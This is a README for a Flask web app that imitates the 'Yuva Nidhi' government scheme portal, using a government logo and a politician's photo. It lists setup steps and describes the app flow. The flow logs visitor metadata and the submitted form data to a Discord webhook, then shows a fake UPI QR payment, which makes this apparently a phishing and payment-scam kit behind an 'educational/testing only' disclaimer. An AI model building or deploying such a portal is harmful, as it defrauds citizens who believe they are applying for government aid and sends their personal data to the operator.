Yuva Nidhi Scheme - Information Gathering Portal

A sophisticated, full-stack Flask web application simulating the "Yuva Nidhi" government portal. Designed for educational and testing purposes only.


---

📁 Project Structure

/
├── app/
│   ├── __init__.py
│   ├── models.py
│   ├── routes.py
│   ├── services.py
│   ├── static/
│   │   ├── css/style.css
│   │   ├── js/main.js
│   │   └── images/[gov.png, loading.gif, Siddaramaiah.png, upi.png]
│   └── templates/
│       ├── base.html
│       ├── index.html
│       ├── status.html
│       └── success.html
├── migrations/
├── .env
├── .gitignore
├── babel.cfg
├── config.py
├── Procfile
├── README.md
├── requirements.txt
└── run.py


---

⚙️ Setup Guide

✅ Step 1: Install Requirements

pkg update && pkg upgrade
pkg install python git build-essential

✅ Step 2: Clone Project

cd /sdcard
git clone <your-repo-url> YN
cd YN

✅ Step 3: Create & Activate Virtual Environment

python -m venv venv
source venv/bin/activate

✅ Step 4: Install Python Dependencies

pip install -r requirements.txt

✅ Step 5: Create Environment File

# .env
SECRET_KEY=your-secret-key-here
DATABASE_URL=sqlite:///instance/app.db
DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/...

✅ Step 6: Initialize Database

export FLASK_APP=run.py
flask db init
flask db migrate -m "initial"
flask db upgrade

✅ Step 7: Run Locally

flask run


---

🔁 Application Flow

1. User lands on / — metadata logged to Discord


2. Fills out AJAX multi-step form — saved to DB and logged


3. Redirected to /status/<id> — payment simulated with QR and loader


4. After 30s or confirmation — redirected to /success




---

❗ Notes

For educational / testing only

Supports translation (Flask-Babel)

Compatible with Railway, Heroku (via Procfile)



---

👨‍💻 Author

Made with ❤️ for full-stack practice.

